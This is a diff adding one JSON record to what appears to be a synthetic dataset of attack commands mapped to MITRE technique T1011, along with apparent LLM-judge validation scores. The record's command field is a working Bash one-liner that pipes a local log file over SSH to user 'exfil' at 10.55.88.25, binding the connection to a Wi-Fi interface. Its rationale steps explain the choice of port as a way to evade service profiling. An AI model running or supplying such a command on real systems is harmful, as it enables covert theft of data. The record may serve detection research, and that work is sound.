@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "iwconfig wlan2 >/dev/null 2>&1 && cat /home/user/.local/share/.sync.log | ssh -q -o ConnectTimeout=5 -o BindAddress=\"$(ip -4 addr show wlan2 | awk '/inet /{print $2}' | cut -d/ -f1)\" -p 49377 exfil@10.55.88.25 \"cat > ~/rx/.sync.log\"",
+  "explanation": "Pipes a file over SSH bound to the wlan2 source IP on a high port, ensuring exfiltration over a separate Wi\u2011Fi medium consistent with T1011.",
+  "rationale_steps": [
+    "Use iwconfig to confirm wlan2 availability without modifying settings.",
+    "Bind SSH to wlan2\u2019s IP to force the transfer over the alternate medium.",
+    "Use an uncommon SSH port to avoid standard service profiles while not changing system-wide routes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-621a2eda-3aa1aba8",
+  "source_prompt_hash": "621a2eda",
+  "timestamp_utc": "2025-09-30T08:26:15.681023Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quoting and command substitutions, valid ssh options, and correct use of redirection and pipelines.",
+        "semantic_score": 5,
+        "semantic_justification": "It reads the local file and streams it over SSH while binding the source to wlan2\u2019s IPv4 address, plausibly forcing exfiltration via the Wi-Fi interface consistent with T1011.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T01:42:05.909816Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators (&&, |), valid flags for all tools used (iwconfig, cat, ssh), and correct use of subshell execution.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 by first checking for the presence of a secondary network interface (wlan2), then exfiltrating data over that interface by binding the SSH connection to the wlan2 IP address while sending sensitive data to a remote server.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T01:42:09.656565Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quoting, correct command separators, and valid flag formats for all tools used.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements the claimed intent by piping a file over SSH, explicitly binding the connection to the `wlan2` interface's IP via `BindAddress`, and using a high port, directly aligning with T1011's exfiltration over a separate Wi-Fi network medium.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:35:29.723753Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
